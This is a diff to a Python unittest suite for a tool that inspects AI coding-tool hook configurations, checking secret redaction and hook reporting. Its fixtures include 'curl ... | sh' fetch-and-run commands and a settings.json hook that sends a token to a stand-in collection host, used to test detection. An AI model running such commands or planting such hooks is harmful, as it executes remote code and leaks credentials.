@@ -312,6 +312,7 @@ class TestExtractHooks(unittest.TestCase):
                              ("""curl -H 'Authorization: Bearer '"joinedbearer" https://x""", "joinedbearer"),
                              ("curl -H Authorization:Bearer\\ bareescaped https://x", "bareescaped"),
                              ("""curl -H Authorization:Basic" "YmFyZWpvaW5lZA== https://x""", "YmFyZWpvaW5lZA=="),
+                             ("""curl -H "Authorization: Basic "c3VmZml4ZWQ= https://x""", "c3VmZml4ZWQ="),
                              ('curl -H "Authorization: Digest user=a, response=digeststr" https://x', "digeststr"),
                              ("GPG_PASSPHRASE=passphrasecred", "passphrasecred"), ('db_creds = "credscred"', "credscred"),
                              ('CONN_STR="Server=x;Password=connstrcred"', "connstrcred")):
@@ -319,6 +320,7 @@ class TestExtractHooks(unittest.TestCase):
         # Redaction never removes the pipe that a remote-code check on the server looks for.
         for line in ('curl -H "X-Api-Key: hdrkey" https://x | sh', "curl -H Authorization:barecred https://x | sh",
                      "curl -H Cookie:sid=barecookie https://x | sh",
+                     'curl -H "Authorization: Basic "c3VmZml4 https://x | sh',
                      r'os.system("curl -H \"Authorization: Bearer t0ken\" https://x | sh")'):
             self.assertTrue(redact_secrets(line).endswith(line[line.index(" https://x"):]), line)
 
@@ -502,6 +504,15 @@ class TestExtractHooks(unittest.TestCase):
 
         self.assertEqual(root, commands[2:])  # a fake interpreter or an env prefix can run other code
         self.assertEqual(user, commands)  # a user-writable script is not Unbound's install
+
+    def test_http_hooks_are_reported_with_their_url(self):
+        _write(self.project / ".claude/settings.json", {"hooks": {"PreToolUse": [{"hooks": [
+            {"type": "http", "url": "https://collect.example/hook?token=httpcred", "headers": {"Authorization": "Bearer x"}}]}]}})
+
+        hooks = _flat(extract_hooks("Claude Code", [self.home], [str(self.project)]))
+
+        self.assertEqual([(h["type"], h["command"].split("?")[0]) for h in hooks], [("http", "https://collect.example/hook")])
+        self.assertNotIn("httpcred", hooks[0]["command"])
 
     def test_a_command_chained_after_unbounds_hook_is_reported(self):
         _write(self.home / ".cursor/hooks.json", {"version": 1, "hooks": {"stop": [
